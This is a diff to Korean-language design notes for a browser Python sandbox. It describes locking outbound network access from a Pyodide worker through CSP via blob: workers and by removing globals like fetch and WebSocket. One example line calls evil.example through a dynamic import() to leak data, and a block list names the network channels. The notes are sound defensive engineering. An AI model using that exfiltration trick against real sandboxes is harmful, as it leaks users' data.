@@ -1836,9 +1836,8 @@ Pyodide 를 Web Worker 로 옮긴다. **worker 에는 `document` 가 없다.** �
 좌표 버퍼가 transferable 이라 복사가 줄고, 평가가 UI 를 멈추지 않게 된다 —
 전에는 슬라이더를 미는 동안 평가 시간만큼 드래그가 끊겼다.
 
-남는 것은 `fetch` 다. worker 에서도 되므로 CSP `connect-src` 로 잠가야 하는데,
-Pyodide 를 CDN 에서 받는 한 그 출처를 열어 두어야 한다. **자체 호스팅이
-전제다.** 아직 안 했다.
+남는 것은 `fetch` 다. worker 에서도 되고 `mode: "no-cors"` 면 CORS 도 안
+걸린다 — 읽지는 못해도 **보내는 것은 막지 못한다**. 이것을 막는 것이 §19.14 다.
 
 이 격리의 근거는 "Pyodide 가 worker 안에서만 돈다"는 것 하나다. 메인 스레드에
 파이썬 실행 경로가 하나라도 생기면 무너지므로, `app.js` 와 `index.html` 에
@@ -2218,3 +2217,67 @@ t1 = tetrahedron("Tetrahedron 1")     # puzzle() 인자가 아니다
 편집 함수는 `{text, start, end}` 를 받아 `{from, to, insert, start, end}` 를
 돌려주는 **순수 함수**다. 커서와 선택 범위 계산이 틀리기 쉬운데, DOM 에 묶여
 있으면 브라우저 없이는 확인할 방법이 없다 (`node web/editor.test.js`).
+
+### 19.14 정의가 밖으로 나가는 길을 막는다
+
+worker 격리(§19.5)가 막는 것은 페이지 바꿔치기와 리다이렉트까지다. 밖으로
+**보내는 것**은 그대로 남아 있다.
+
+지금 페이지가 들고 있는 것이 없어 훔칠 것이 없다 — **그것이 지켜야 할
+성질이다.** 무언가를 저장하게 되면 그때 이 구멍이 실제 위험이 된다.
+
+#### CSP 하나로는 안 된다
+
+GitHub Pages 에는 응답 헤더를 줄 수 없으므로 CSP 를 거는 길은
+`<meta http-equiv>` 뿐이다. 그런데 **worker 는 문서의 CSP 를 물려받지 않는다.**
+worker 전역의 정책은 worker 스크립트의 **응답 헤더**에서 온다. 헤더가 없으면
+정책도 없다. 즉 `index.html` 에 meta 로 박아도 `fetch` 가 실제로 도는 worker
+안은 안 잠긴다.
+
+물려받는 경우가 하나 있다. worker 스크립트의 출처가 `blob:` 같은 로컬 스킴이면
+만든 쪽의 정책을 물려받는다. 그래서 worker 를 `blob:` 로 띄운다.
+
+#### 능력 제거 하나로도 안 된다
+
+반대쪽도 마찬가지다. 전역에서 `fetch` 를 지워도 이것은 못 지운다.
+
+```python
+js.eval("import('https://evil.example/x.js?d=' + data)")
+```
+
+동적 `import()` 는 함수가 아니라 **문법**이다. 지울 대상이 없다. 그리고
+`connect-src` 가 아니라 `script-src` 소관이라 CSP 쪽에서만 잡힌다. 막으려면
+`eval` 과 `Function` 을 지워야 하는데 그건 Pyodide 자신이 쓴다.
+
+**둘은 서로의 구멍을 메우는 관계지 이중 보험이 아니다.** 그래서 둘 다 한다.
+
+#### 통로를 끊는다
+
+부팅이 끝난 뒤 worker 전역에서 네트워크 통로를 끊는다.
+
+```text
+fetch  XMLHttpRequest  WebSocket  EventSource  WebTransport
+Worker  SharedWorker  importScripts  caches
+```
+
+`Worker` 가 목록에 있는 이유는 그것이 통로여서가 아니다. **중첩 worker 는
+손대지 않은 전역을 새로 받는다** — 하나 띄우면 지운 것이 전부 돌아온다.
+`caches` 는 `add(url)` 이 실제 요청을 낸다.
+
+**순서가 성질이다.** Pyodide 자신이 wasm 과 stdlib 을 `fetch` 로 받으므로
+부팅보다 먼저 끊으면 부팅이 안 되고, 정의보다 늦게 끊으면 소용이 없다. 그
+사이는 `boot()` 안의 한 지점뿐이다.
+
+`delete self.fetch` **는 아무것도 안 지운다.** `fetch` 는 전역의 own property 가
+아니라 `WorkerGlobalScope.prototype` 에 있어서, `delete` 는 `true` 를 돌려주고
+이름은 그대로 산다. 지운 줄 알고 넘어가기 딱 좋고, 브라우저에서 눈으로 보면
+"잘 된다"로 보인다. 그래서 사슬을 훑어 지운 뒤 **지워졌든 아니든** own property
+로 못질한다 (`writable: false, configurable: false`).
+
+하나라도 남으면 **부팅을 실패시킨다.** 반쯤 끊긴 채로 도는 것이 제일 나쁘다 —
+화면은 멀쩡하고 구멍만 남는다. 여기서 죽으면 오류 메시지가 그 자리에 뜬다.
+
+`node web/revoke.test.js` 가 이 함수들을 소스에서 오려내 가짜 전역에 물려
+돌린다. 진짜 worker 전역과 같은 모양으로 만든다 — 프로토타입에 `fetch`,
+own property 에 생성자들. 첫 검사는 `delete self.fetch` 가 **실패한다**는 것
+자체다. 그게 거짓이면 나머지 검사는 아무것도 증명하지 않는다.
